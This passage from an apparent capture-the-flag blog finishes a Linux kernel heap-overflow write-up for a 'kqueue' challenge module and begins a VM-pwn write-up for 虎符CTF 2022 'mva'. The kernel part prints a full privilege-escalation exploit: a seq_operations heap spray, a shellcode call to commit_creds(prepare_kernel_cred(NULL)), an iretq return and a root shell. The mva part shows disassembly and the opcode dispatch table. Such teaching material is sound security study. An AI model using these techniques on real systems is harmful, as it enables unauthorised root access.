class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAVE          0xB105BABE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;</span><br><span class="line">    <span class="type">uint16_t</span> data_size;</span><br><span class="line">    <span class="type">uint16_t</span> entry_idx;</span><br><span class="line">    <span class="type">uint16_t</span> queue_idx;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ROOTFS_HEAP_OVERFLOW_H</span></span></span><br></pre></td></tr></table></figure>
<p>另外注意，本题中的所有检查实际上都是虚张声势，因为err函数并没有让程序强制退出，仅仅只是输出了一行错误信息就允许继续运行下去了。因此利用的思路可以尽情放开。</p>
<p>刚刚打开qemu时，笔者想用调试的方法查看LKM的运行过程。实际上，如果能够读取到<code>/sys/module/kqueue/.text</code>、<code>/sys/module/kqueue/.data</code>、<code>/sys/module/kqueue/.bss</code>的值或使用<code>lsmod</code>命令，就能够获取到LKM相应段的基址，但本题中权限不允许。这就比较麻烦了，需要首先将断点下在用户态程序中，然后一步一步跟踪到内核找到相应函数的调用位置。笔者尝试过通过搜索字符串等方式获取基址，但都失败了。这也是笔者认为这道题最为恶心的一个部分了。<s>（毕竟耗了一个晚上）</s></p>
<p>不过本题还好，不是太需要用到调试，下面的调试仅为演示。</p>
<p>测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap_overflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        error_log(<span class="string">&quot;Cannot open /dev/kqueue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> create_req = &#123;</span><br><span class="line">            .max_entries = <span class="number">0xFFFFFFFF</span>,</span><br><span class="line">            .data_size = <span class="number">0x20</span> * <span class="number">8</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    ioctl(fd, CREATE_KQUEUE, &amp;create_req);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是进入ioctl函数中内核的执行情况，在kmalloc分配到内存后，查看周围的内存环境，发现有大量的重复内容，推测这就是前面0x200次打开stat文件申请到的seq_operations结构体。</p>
<p><img src="https://img-blog.csdnimg.cn/3c85c15a2b374d01a4b24e4cd1fdb2da.png" alt="" /><br />
我们可以在IDA中打开vmlinux，找到执行start函数指针的位置（函数名为seq_read）：<br />
<img src="https://img-blog.csdnimg.cn/8196e34339e84c70bc80459ca4c0a33d.png" alt="" /><br />
其与内核基址地址的差为0x201179。再找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的基址：<br />
prepare_kernel_cred：偏移0x8C580。<br />
<img src="https://img-blog.csdnimg.cn/2d98da570bc74161ba090bfc01054182.png" alt="" /><br />
commit_creds：偏移0x8C140<br />
<img src="https://img-blog.csdnimg.cn/397f050e23dc49e4a4ec2287a2ed1400.png" alt="在这里插入图片描述" /><br />
在调用start前，内核将下一条指令的地址压入栈中，我们利用的就是这个地址，来获取内核的加载基址，进而执行<code>commit_cred(prepare_kernel_cred(NULL))</code>函数。自然地，我们可以写一个shellcode来完成这件事情。由于本题没有开启SMEP，因此我们可以直接用用户态的shellcode地址覆盖seq_operations中的地址，内核可以执行用户态的shellcode。</p>
<p>注意在save函数中，其申请的空间大小是queue-&gt;queue_size，我们之前传入的max_entries为0xFFFFFFFF，这使得queue-&gt;queue_size=0x20，即新申请的空间与seq_operations在相近的位置。然而其拷贝的实际长度为request.data_size，可以产生溢出。当request.max_entries=0时，拷贝的循环不会执行，而是只会执行循环前面的memcpy，将queue-&gt;data拷贝到新空间中，因此，如果我们在queue-&gt;data中写入shellcode的地址，就有覆盖一个seq_operations结构体的可能性。经过测试证明，当queue-&gt;data传入0x40的时候，溢出0x20个字节正好能够覆盖一个seq_operations结构体。</p>
<p>最终的exp：（头文件在上面，不变）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap_overflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">size_t</span> sh = (<span class="type">size_t</span>)getShell;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shellcode</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov r11, [rsp + 0x8];&quot;</span></span><br><span class="line">            <span class="string">&quot;sub r11, 0x201179;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;add r12, 0x8C580;&quot;</span>     <span class="comment">// prepare_kernel_cred</span></span><br><span class="line">            <span class="string">&quot;add r11, 0x8C140;&quot;</span>     <span class="comment">// commit_creds</span></span><br><span class="line">            <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">            <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, rax;&quot;</span></span><br><span class="line">            <span class="string">&quot;call r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_rflags;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, sh;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="type">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        error_log(<span class="string">&quot;Cannot open /dev/kqueue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x20</span>; i++)</span><br><span class="line">        data[i] = (<span class="type">size_t</span>)shellcode;</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> create_req = &#123;</span><br><span class="line">            .max_entries = <span class="number">0xFFFFFFFF</span>,</span><br><span class="line">            .data_size = <span class="number">0x20</span> * <span class="number">8</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CREATE_KQUEUE, &amp;create_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue created.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> edit_req = &#123;</span><br><span class="line">            .queue_idx = <span class="number">0</span>,</span><br><span class="line">            .entry_idx = <span class="number">0</span>,</span><br><span class="line">            .data = (<span class="type">char</span>*)data,</span><br><span class="line">    &#125;;</span><br><span class="line">    info_log(<span class="string">&quot;ready to edit queue, content below:&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)data, <span class="number">0x100</span>);</span><br><span class="line">    ioctl(fd, EDIT_KQUEUE, &amp;edit_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue edited.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    info_log(<span class="string">&quot;0x200 stat file opened.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> save_req = &#123;</span><br><span class="line">            .queue_idx = <span class="number">0</span>,</span><br><span class="line">            .max_entries = <span class="number">0</span>,</span><br><span class="line">            .data_size = <span class="number">0x40</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, SAVE, &amp;save_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue saved.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;ready to read stat file...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        read(seq_fd[i], data, <span class="number">1</span>);</span><br><span class="line">    info_log(<span class="string">&quot;stat file reading completed.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>提权成功。（虽然不是以#开头但可以读取flag文件）<br />
<img src="https://img-blog.csdnimg.cn/88c546691ef24b55b94341a41477c9c5.png" alt="" /><br />
在内核态堆溢出题中，我们需要充分利用“大小相等的内存块可能会被分配到相邻位置”这一特性溢出覆盖。内核中的内存块空间没有用户态那样的块首结构，需要注意。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">虎符CTF-2022 mva 题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:07" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:07+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是一道vm题。前几天师傅让我看看这道题，发现是一种没有做过的类型。查询相关资料之后有了一定的了解。由于是第一次做这种题，就将wp写的尽可能详细一些，作为笔记备查。</p>
<p>源文件：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">my_github</a></p>
<p>vm-pwn是一种虚拟机pwn，我的理解是，我们自己用C语言写一个虚拟机。在这个虚拟机里面可以进行各种操作，如加减乘除、堆栈操作等。这里各种操作的操作码可以是我们自己定义的，比如我们定义01开头的指令为加，02开头为减，等等。我们不管当前的主流架构是怎么实现的，这个程序本身相当于是”发明“了一种小型的轻量级的汇编语言。我们需要找到这种语言的漏洞以跳出虚拟机，进而getshell或getflag。</p>
<p>大致了解了这种题目的背景之后，我们就可以进去看题了。</p>
<p><img src="https://img-blog.csdnimg.cn/00463dbffccb42a095c58f9eec334add.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<p>指令首先是写在了bss段的一个地方，在main函数中有一个死循环，里面的sub_11E9函数应该就是读取指令的函数了。改名为read_cmd。</p>
<p>这里反汇编看着不太清楚，还是要深入到汇编去查看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001213                 lea     rdx, code</span><br><span class="line">.text:000000000000121A                 add     rax, rdx</span><br><span class="line">.text:000000000000121D                 mov     eax, [rax]</span><br><span class="line">.text:000000000000121F                 mov     [rbp+var_C], eax</span><br><span class="line">.text:0000000000001222                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001225                 shr     eax, 18h</span><br><span class="line">.text:0000000000001228                 mov     edx, eax</span><br><span class="line">.text:000000000000122A                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000122D                 shr     eax, 8</span><br><span class="line">.text:0000000000001230                 and     eax, 0FF00h</span><br><span class="line">.text:0000000000001235                 or      edx, eax</span><br><span class="line">.text:0000000000001237                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000123A                 shl     eax, 8</span><br><span class="line">.text:000000000000123D                 and     eax, 0FF0000h</span><br><span class="line">.text:0000000000001242                 or      edx, eax</span><br><span class="line">.text:0000000000001244                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001247                 shl     eax, 18h</span><br><span class="line">.text:000000000000124A                 or      eax, edx</span><br></pre></td></tr></table></figure>

<p>上面这一段汇编是read_cmd里面的，主要功能就是从输入的指令中读取4字节后将这4字节高位变低位，低位变高位（从小端序到大端序的转换）。在read_cmd返回后，eax中存放的就是读取到的指令。读取指令后返回到main函数中，一开始看到main函数下面有很多没有解析的部分，将其手动转为汇编代码，发现有很多跳转指令，那么基本可以判断出，下面就是解析并执行指令的部分了。跳转指令应该是在判断指令的类型。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000135E                 mov     eax, 0</span><br><span class="line">.text:0000000000001363                 call    read_cmd</span><br><span class="line">.text:0000000000001368                 mov     [rbp+var_23C], eax</span><br><span class="line">.text:000000000000136E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001374                 shr     eax, 18h</span><br><span class="line">.text:0000000000001377                 mov     [rbp+var_240], ax</span><br><span class="line">.text:000000000000137E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001384                 sar     eax, 10h</span><br><span class="line">.text:0000000000001387                 mov     [rbp+var_249], al</span><br><span class="line">.text:000000000000138D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001393                 sar     ax, 8</span><br><span class="line">.text:0000000000001397                 mov     [rbp+var_248], al</span><br><span class="line">.text:000000000000139D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013A3                 mov     [rbp+var_247], al</span><br><span class="line">.text:00000000000013A9                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013AF                 mov     [rbp+var_23E], ax</span><br></pre></td></tr></table></figure>

<p>在调用read_cmd函数之后，main函数将指令的不同位保存到栈中不同的位置，但这些位置基本上相邻。</p>
<p>下图为栈中保存的指令值情况（假设读取的指令为0x76543210）</p>
<table align=center>
<tr align=center>
    <td> addr </td> <td> +0 </td> <td> +1 </td> <td> +2 </td> <td> +3 </td>
    <td> +4 </td> <td> +5 </td> <td> +6 </td> <td> +7 </td>
</tr>
<tr align=center>
    <td> rbp-0x250 </td> <td> - </td> <td> - </td> <td> - </td> <td> - </td>
    <td> - </td> <td> - </td> <td> - </td> <td> 32 </td>
</tr>
<tr align=center>
    <td> rbp-0x248 </td> <td> 54 </td> <td> 76 </td> <td> - </td> <td> - </td>
    <td> - </td> <td> - </td> <td> - </td> <td> - </td>
</tr>
<tr align=center>
    <td> rbp-0x240 </td> <td> 10 </td> <td> - </td> <td> 76 </td> <td> 54 </td>
    <td> 76 </td> <td> 54 </td> <td> 32 </td> <td> 10 </td>
</tr>
</table>

<p>之后判断原输入的最低位是否大于0xF，如果大于则跳过该指令。这说明这个虚拟机中的指令码只可能有0x0~0xF最多16种。我们修改一下输入，然后接着跟着执行流一步一步走。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000000206C dword_206C      dd 0FFFFF38Bh           ; DATA XREF: main+134↑o</span><br><span class="line">.rodata:000000000000206C                                         ; main+140↑o</span><br><span class="line">.rodata:0000000000002070                 dd 0FFFFF399h</span><br><span class="line">.rodata:0000000000002074                 dd 0FFFFF3D2h</span><br><span class="line">.rodata:0000000000002078                 dd 0FFFFF460h</span><br><span class="line">.rodata:000000000000207C                 dd 0FFFFF4F0h</span><br><span class="line">.rodata:0000000000002080                 dd 0FFFFF57Eh</span><br><span class="line">.rodata:0000000000002084                 dd 0FFFFF60Ch</span><br><span class="line">.rodata:0000000000002088                 dd 0FFFFF686h</span><br><span class="line">.rodata:000000000000208C                 dd 0FFFFF714h</span><br><span class="line">.rodata:0000000000002090                 dd 0FFFFF735h</span><br><span class="line">.rodata:0000000000002094                 dd 0FFFFF7A7h</span><br><span class="line">.rodata:0000000000002098                 dd 0FFFFF80Ah</span><br><span class="line">.rodata:000000000000209C                 dd 0FFFFF839h</span><br><span class="line">.rodata:00000000000020A0                 dd 0FFFFF8B4h</span><br><span class="line">.rodata:00000000000020A4                 dd 0FFFFF940h</span><br><span class="line">.rodata:00000000000020A8                 dd 0FFFFF994h</span><br></pre></td></tr></table></figure>

<p>接下来，程序提到了rodata中的这个地方，这里发现这个未知数据的长度为64字节，正好是16*4，每一个4字节对应一条指令，但具体含义尚不清楚。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000013D6                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:00000000000013DE                 lea     rax, dword_206C</span><br><span class="line">.text:00000000000013E5                 mov     eax, [rdx+rax]</span><br><span class="line">.text:00000000000013E8                 cdqe</span><br><span class="line">.text:00000000000013EA                 lea     rdx, dword_206C</span><br><span class="line">.text:00000000000013F1                 add     rax, rdx</span><br><span class="line">.text:00000000000013F4                 db      3Eh</span><br><span class="line">.text:00000000000013F4                 jmp     rax</span><br></pre></td></tr></table></figure>

<p>往下看不远处，我们就知道这个64字节数据是用来干嘛的了。它起始就是一个地址的偏移量，将对应指令的偏移量加上rodata的地址值，得到的就是指令对应的执行部分的地址。将其重命名为exec_offset。</p>
<p>……</p>
